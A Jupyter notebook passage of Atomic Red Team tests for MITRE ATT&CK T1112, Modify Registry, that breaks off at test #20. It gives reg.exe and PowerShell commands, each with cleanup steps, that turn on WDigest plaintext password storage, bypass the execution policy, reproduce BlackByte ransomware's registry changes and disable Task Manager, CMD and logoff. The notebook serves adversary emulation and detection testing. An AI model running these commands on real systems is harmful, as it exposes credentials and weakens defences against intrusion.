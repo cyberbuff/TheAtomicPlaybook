{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0c4cd0c2",
   "metadata": {},
   "source": "# T1112 - Modify Registry\nAdversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication."
  },
  {
   "cell_type": "markdown",
   "id": "33a2d8ba",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "42c38073",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Modify Registry of Current User Profile - cmd",
    "Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "99a9f79d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "fe9dd9c9",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v HideFileExt /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f86a9c8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2187e2f7",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Modify Registry of Local Machine - cmd",
    "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the modified entry in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "35018c65",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "91974855",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3b8b3b8d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "78d6df2d",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Modify registry to store logon credentials",
    "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2915965e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "52fae086",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "10d6de0b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "037216f1",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Add domain to Trusted sites Zone",
    "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "931ac064",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "0587d8de",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$key = \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"\nRemove-item  $key -Recurse -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "091e84ff",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9a1a5b0a",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Javascript in registry",
    "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fc3e3d65",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "cfd9bde6",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8cdbc718",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b04202ad",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Change Powershell Execution Policy to Bypass",
    "Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3211a795",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "8e551890",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ntry { Set-ExecutionPolicy -ExecutionPolicy Default -Scope LocalMachine -Force } catch {}\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6afafdf8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "70ac2390",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - BlackByte Ransomware Registry Changes - CMD",
    "This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c7a29b65",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "af37359c",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v LocalAccountTokenFilterPolicy /f >nul 2>&1\nreg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLinkedConnections /f >nul 2>&1\nreg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\ /v LongPathsEnabled /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "13047cb5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "02895799",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - BlackByte Ransomware Registry Changes - Powershell",
    "This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9c897eab",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "80d8ec34",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "98421b9a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f52bbe67",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Disable Windows Registry Tool",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "93d8348b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "cc7ce078",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\npowershell Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" -Name DisableRegistryTools -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7c46632c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d3522619",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Disable Windows CMD application",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "672aae87",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "0aaea66f",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dea2e1bd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "25d0a62b",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - Disable Windows Task Manager application",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "012c20ca",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "7b357a06",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cd52ae47",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 11 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f9429d6a",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - Disable Windows Notification Center",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.\nSee how remcos rat abuses this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f840636c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "f2efb27d",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3471beff",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 12 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "dcc58733",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - Disable Windows Shutdown Button",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ce14621b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "bcb6d62f",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b5b8dec8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 13 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9175fc8c",
   "metadata": {},
   "source": [
    "### Atomic Test #14 - Disable Windows LogOff Button",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /t REG_DWORD /d 1 /f\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e8474c84",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "76679760",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /f >nul 2>&1\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6f5849a0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 14 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "965b0991",
   "metadata": {},
   "source": [
    "### Atomic Test #15 - Disable Windows Change Password Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5330774b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 15"
  },
  {
   "cell_type": "markdown",
   "id": "4d2a8c6a",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "395c21c4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 15 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "fb20c70f",
   "metadata": {},
   "source": [
    "### Atomic Test #16 - Disable Windows Lock Workstation Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.\nSee how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c5d83e63",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 16"
  },
  {
   "cell_type": "markdown",
   "id": "e957d4f2",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "893277f5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 16 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "44ee2da2",
   "metadata": {},
   "source": [
    "### Atomic Test #17 - Activate Windows NoDesktop Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to hide all icons on Desktop Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1a880f20",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 17"
  },
  {
   "cell_type": "markdown",
   "id": "2f4b536c",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bd78b18e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 17 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "047946a8",
   "metadata": {},
   "source": [
    "### Atomic Test #18 - Activate Windows NoRun Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Run menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cd6efad3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 18"
  },
  {
   "cell_type": "markdown",
   "id": "8e4800e1",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /f \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3c2283ab",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 18 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f69cfca9",
   "metadata": {},
   "source": [
    "### Atomic Test #19 - Activate Windows NoFind Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Search menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "acb2d59f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 19"
  },
  {
   "cell_type": "markdown",
   "id": "57299112",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5b5d9994",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 19 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "400f5502",
   "metadata": {},
   "source": [
    "### Atomic Test #20 - Activate Windows NoControlPanel Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable Control Panel Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
